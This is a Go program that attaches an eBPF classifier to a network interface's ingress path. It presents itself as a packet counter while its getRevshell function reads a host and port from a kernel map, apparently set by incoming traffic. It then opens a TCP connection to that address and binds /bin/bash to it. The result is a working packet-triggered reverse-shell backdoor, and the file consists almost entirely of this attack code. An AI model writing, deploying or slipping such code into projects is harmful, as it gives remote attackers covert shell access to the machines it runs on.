package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"time"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

//go:generate go tool bpf2go -tags linux traffic_test ebpf/traffic-test.c

var conns map[string]bool = make(map[string]bool)

func displayCounter(objs traffic_testObjects) {
	var count traffic_testTrafficOperation
	err := objs.TrafficOps.Lookup(uint32(0), &count)
	if err != nil {
		log.Fatal("(count) Map lookup:", err)
	}
	log.Printf("Received %d packets", count.Offset)
}

func int2ip(nn uint32) net.IP {
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, nn)
	return ip
}

func getRevshell(objs traffic_testObjects) {
	var rev traffic_testTrafficOperation
	err := objs.TrafficOps.Lookup(uint32(1), &rev)
	if err != nil {
		log.Fatal("(revshell) Map lookup:", err)
	}
	if rev.Host != 0 && rev.Port != 0 {
		host := int2ip(rev.Host)
		connstr := host.String() + ":" + fmt.Sprintf("%d", rev.Port)
		if conns[connstr] {
			return
		}
		conns[connstr] = true
		fmt.Println("Spawning revshell to " + connstr)
		go func() {
			c, _ := net.Dial("tcp", connstr)
			cmd := exec.Command("/bin/bash")
			cmd.Stdin = c
			cmd.Stdout = c
			cmd.Stderr = c
			err := cmd.Run()
			if err != nil {
				fmt.Printf("[ERROR] Fail in revshell for '%s': %s\n", connstr, err)
			}
			conns[connstr] = false
		}()
	}
}

func main() {
	if len(os.Args) < 2 {
		log.Fatalf("Please specify a network interface")
	}

	// Look up the network interface by name.
	ifaceName := os.Args[1]
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("lookup network iface %q: %s", ifaceName, err)
	}

	// Load pre-compiled programs into the kernel.
	objs := traffic_testObjects{}
	if err := loadTraffic_testObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %s", err)
	}
	defer objs.Close()

	// Attach the program to Ingress TC.
	l, err := link.AttachTCX(link.TCXOptions{
		Interface: iface.Index,
		Program:   objs.ClassifierIngress,
		Attach:    ebpf.AttachTCXIngress,
	})
	if err != nil {
		log.Fatalf("could not attach TCx program: %s", err)
	}
	defer l.Close()

	log.Printf("Counting incoming packets on %s..", ifaceName)

	// Periodically fetch the packet counter from PktCount,
	// exit the program when interrupted.
	tick := time.Tick(time.Second * 2)
	stop := make(chan os.Signal, 5)
	signal.Notify(stop, os.Interrupt)
	for {
		select {
		case <-tick:
			displayCounter(objs)
			getRevshell(objs)
		case <-stop:
			log.Print("Received signal, exiting..")
			return
		}
	}
}
